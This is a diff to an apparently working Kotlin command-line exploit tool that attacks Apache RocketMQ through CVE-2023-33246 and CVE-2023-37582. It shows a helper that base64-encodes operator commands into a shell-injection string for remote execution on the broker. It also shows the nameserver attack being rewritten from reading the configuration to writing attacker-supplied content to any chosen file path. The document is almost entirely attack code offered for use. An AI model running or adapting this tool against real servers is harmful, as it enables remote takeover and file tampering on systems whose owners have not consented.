@@ -23,14 +23,6 @@ abstract class BaseAttackCommand(
     name: String,
     help: String
 ) : CliktCommand(name = name, help = help) {
-    protected val target by option("-t", "--target")
-        .help("Target address (host:port)")
-        .required()
-    
-    protected val cmd by option("-c", "--cmd")
-        .help("Command to execute")
-        .default("touch /tmp/success")
-
     protected fun getCmd(cmd: String): String {
         val cmdBase = Base64.getEncoder().encodeToString(cmd.toByteArray())
         return "-c \$@|sh . echo echo \"$cmdBase\"|base64 -d|sh -i;"
@@ -41,6 +33,14 @@ class AttackBroker : BaseAttackCommand(
     name = "AttackBroker",
     help = "Execute commands on RocketMQ broker (CVE-2023-33246)"
 ) {
+    private val target by option("-t", "--target")
+        .help("Target address (host:port)")
+        .required()
+    
+    private val cmd by option("-c", "--cmd")
+        .help("Command to execute")
+        .required()
+
     override fun run() {
         echo("Executing command $cmd on broker $target")
         val admin = DefaultMQAdminExt()
@@ -67,19 +67,32 @@ class AttackBroker : BaseAttackCommand(
 
 class AttackNamesrv : BaseAttackCommand(
     name = "AttackNamesrv",
-    help = "Attack RocketMQ nameserver (CVE-2023-37582)"
+    help = "Write arbitrary file to RocketMQ nameserver (CVE-2023-37582)"
 ) {
+    private val target by option("-t", "--target")
+        .help("Target address (host:port)")
+        .required()
+
+    private val file by option("-f", "--file")
+        .help("Target file path to write")
+        .required()
+
+    private val data by option("-d", "--data")
+        .help("Content to write into the file")
+        .required()
+
     override fun run() {
         echo("Attack name server $target")
+        echo("Will write content to file: $file")
         val admin = DefaultMQAdminExt()
         try {
             admin.start()
-            val nameServerConfig = admin.getNameServerConfig(arrayOf(target).toList())
-            nameServerConfig.forEach { (key, prop) ->
-                prop.forEach { (name, value) ->
-                    echo("$key.$name => $value")
-                }
+            val props = Properties().apply {
+                setProperty("configStorePath", file)
+                setProperty("productEnvName", "center\\n$data")
             }
+
+            admin.updateNameServerConfig(props, arrayOf(target).toList())
         } finally {
             admin.shutdown()
         }
